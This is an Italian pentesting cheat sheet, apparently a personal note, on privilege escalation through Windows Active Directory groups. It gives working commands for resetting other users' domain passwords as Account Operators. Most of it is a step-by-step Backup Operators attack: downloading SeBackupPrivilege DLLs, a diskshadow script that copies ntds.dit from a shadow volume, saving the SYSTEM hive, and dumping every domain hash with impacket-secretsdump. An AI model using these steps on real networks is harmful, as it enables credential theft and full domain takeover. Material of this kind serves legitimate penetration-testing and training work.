### **ACCOUNT OPERATORS**
Può gestire e creare utenti amministratore non amministratore, quindi anche cambiare le password di altri utenti
```powershell
net user <USER> NewPassword1234 /domain
```
### **BACKUP OPERATORS**
*DUMP NTDS.DIT*
Dobbiamo riuscire a fare il backup del file ntds.dit, un file contenente tutti gli hash e informazioni del dominio
Scarica i seguenti file
https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
___
https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
Crea un file chiamato diskshadow.txt contenente queste righe
```vim
set context persistent nowriters #
set metadata c:\tmp\metadata.cab #
add volume c: alias myAlias #
create #
expose %myAlias% x: #
exec "cmd.exe" /c copy x:\windows\ntds\ntds.dit c:\tmp\ntds.dit #
delete shadows volume %myAlias% #
reset #
```
crea una cartella tmp sulla macchina
```powershell
mkdir c:\tmp
```
e carica tutti e tre i file
```powershell
upload SeBackupPrivilegeCmdLets.dll
upload SeBackupPrivilegeUtils.dll
upload diskshadow.txt
```
avvia diskshadow
```powershell
diskshadow.exe /s c:\tmp\diskshadow.txt
```
![[Pasted image 20230510125209.png]]
Importa i moduli caricati prima e usa il comando
```powershell
Import-Module
Set-SeBackupPrivilege
```
Copia il file SYSTEM e NTDS.dit e scaricateli
```powershell
reg save HKLM\SYSTEM c:\tmp\system
copy-filesebackupprivilege x:\windows\ntds\ntds.dit c:\tmp\ntds.dit -overwrite
```
Usa secretdump di IMPACKET per dumpare gli hash ed entra con evil-winrm
```bash
impacket-secretsdump -ntds ntds.dit -system system local
```
### **SERVER OPERATOR**
Puoi restartare i servizi e modificarne i PATH